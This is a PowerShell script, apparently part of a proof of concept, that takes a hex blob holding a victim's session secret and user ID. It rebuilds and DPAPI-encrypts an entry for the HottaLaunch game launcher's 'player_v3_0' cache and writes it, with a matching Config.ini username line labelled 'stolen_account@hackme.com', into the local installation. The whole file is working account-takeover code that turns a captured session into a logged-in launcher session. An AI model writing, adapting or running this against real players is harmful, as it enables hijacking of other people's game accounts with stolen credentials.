param(
    [Parameter(Mandatory, Position=0)][string]$Blob,
    [Parameter(Position=1)][string]$GamePath
)

Add-Type -AssemblyName System.Security

$entropy = [System.Text.Encoding]::ASCII.GetBytes("gfsa97538uoxdrwp`0")
$enc = [System.Text.Encoding]::ASCII

# --- decode blob (same logic as poc.py decode) ---
$raw = [byte[]]::new($Blob.Length / 2)
for ($i = 0; $i -lt $raw.Length; $i++) { $raw[$i] = [Convert]::ToByte($Blob.Substring($i*2, 2), 16) }

$secret = $null
$uid = $null
$i = 0
while ($i -lt $raw.Length - 4) {
    $len = [BitConverter]::ToUInt32($raw, $i)
    if ($len -ge 2 -and $len -le 200) {
        $end = $i + 4 + $len
        if ($end -le $raw.Length) {
            $chunk = $raw[($i+4)..($end-1)]
            $printable = $true
            foreach ($b in $chunk) { if ($b -lt 0x20 -or $b -ge 0x7f) { $printable = $false; break } }
            if ($printable) {
                $s = $enc.GetString($chunk)
                if ($s -match '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$') { $secret = $s }
                if ($s -match '^\d{8}$' -and -not $uid) { $uid = $s }
                $i = $end
                continue
            }
        }
    }
    $i++
}

if (-not $secret -or -not $uid) {
    Write-Host "[-] Could not extract secret or UID from blob"
    exit 1
}

Write-Host "[+] Secret: $secret"
Write-Host "[+] UID:    $uid"

# --- build player_v3_0 plaintext ---
function HexField($str, $rawSize) {
    $r = [byte[]]::new($rawSize)
    $b = $enc.GetBytes($str)
    [Array]::Copy($b, 0, $r, 0, $b.Length)
    return [BitConverter]::ToString($r).Replace('-','').ToLower()
}

$ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$flags = [byte[]]@(0x08, 0x00, 0x00, 0x00)

$hexStr = (HexField $secret 260) +
          (HexField $uid 260) +
          (HexField $uid 260) +
          (HexField $uid 64) +
          ([BitConverter]::ToString($flags).Replace('-','').ToLower()) +
          (HexField $ts 260)

$plain = [byte[]]::new($hexStr.Length + 1)
$hexBytes = $enc.GetBytes($hexStr)
[Array]::Copy($hexBytes, 0, $plain, 0, $hexBytes.Length)

Write-Host "[+] Plaintext: $($plain.Length) bytes"

# --- DPAPI encrypt + obfuscate ---
$encrypted = [System.Security.Cryptography.ProtectedData]::Protect($plain, $entropy, "CurrentUser")
$obf = [byte[]]::new($encrypted.Length)
for ($i = 0; $i -lt $encrypted.Length; $i++) { $obf[$i] = (($encrypted[$i] + 1) -bxor 0xAB) -band 0xFF }
$playerHex = [BitConverter]::ToString($obf) -replace '-',''

Write-Host "[+] Encrypted: $($playerHex.Length) chars"

# --- build email blob ---
$existing = @()
if ($GamePath) {
    $playerPath = Join-Path $GamePath "HottaLaunch\UserData\cache\player_v3_0"
    $configPath = Join-Path $GamePath "HottaLaunch\UserData\Config\Config.ini"
    if (Test-Path $playerPath) {
        $existing = @(Get-Content $playerPath | Where-Object { $_.Trim() })
    }
}
$counter = $existing.Count + 1

$emailBytes = $enc.GetBytes("stolen_account${counter}@hackme.com")
$emailEnc = [System.Security.Cryptography.ProtectedData]::Protect($emailBytes, $entropy, "CurrentUser")
$emailObf = [byte[]]::new($emailEnc.Length)
for ($i = 0; $i -lt $emailEnc.Length; $i++) { $emailObf[$i] = (($emailEnc[$i] + 1) -bxor 0xAB) -band 0xFF }
$emailHex = [BitConverter]::ToString($emailObf) -replace '-',''

# --- output or write ---
if ($GamePath) {
    if (-not (Test-Path $playerPath)) {
        Write-Host "`n[-] player_v3_0 not found at $playerPath"
        exit 1
    }

    Copy-Item $playerPath "$playerPath.bak" -Force

    # Read existing file as raw bytes, append with CRLF separator using WriteAllBytes
    $existingBytes = [System.IO.File]::ReadAllBytes($playerPath)
    $newEntryBytes = $enc.GetBytes($playerHex)
    $crlf = [byte[]]@(0x0D, 0x0A)
    $combined = [byte[]]::new($existingBytes.Length + $crlf.Length + $newEntryBytes.Length)
    [Array]::Copy($existingBytes, 0, $combined, 0, $existingBytes.Length)
    [Array]::Copy($crlf, 0, $combined, $existingBytes.Length, $crlf.Length)
    [Array]::Copy($newEntryBytes, 0, $combined, $existingBytes.Length + $crlf.Length, $newEntryBytes.Length)
    [System.IO.File]::WriteAllBytes($playerPath, $combined)

    Write-Host "`n[+] Appended to $playerPath"

    if (Test-Path $configPath) {
        Copy-Item $configPath "$configPath.bak" -Force
        $content = Get-Content $configPath -Raw
        if ($content -match "(?m)^${uid}_username=") {
            $content = $content -replace "(?m)^${uid}_username=.*$", "${uid}_username=$emailHex"
        } else {
            $content = $content -replace "(?m)(\[User\])", "`$1`r`n${uid}_username=$emailHex"
        }
        $content | Set-Content $configPath -NoNewline
        Write-Host "[+] Config.ini: ${uid}_username = stolen_account${counter}@hackme.com"
    }

    Write-Host ""
} else {
    Write-Host "`n--- player_v3_0 (append as new line) ---"
    Write-Host $playerHex
    Write-Host "`n--- Config.ini [User] (add/replace) ---"
    Write-Host "${uid}_username=$emailHex"
}
